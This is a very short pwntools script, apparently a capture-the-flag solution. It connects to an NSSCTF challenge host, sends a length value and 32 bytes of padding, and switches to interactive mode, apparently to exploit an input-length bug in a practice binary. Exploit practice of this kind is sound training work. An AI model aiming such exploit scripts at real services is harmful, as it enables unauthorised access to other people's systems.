from pwn import *

context.log_level="debug"
#io = process("./pwn")
io = remote("node5.anna.nssctf.cn", 24265)
io.recvuntil(b"ength: ")
io.sendline(b"32")
io.recvuntil(b"content: ")
io.send(b"a" * 32)

io.interactive()
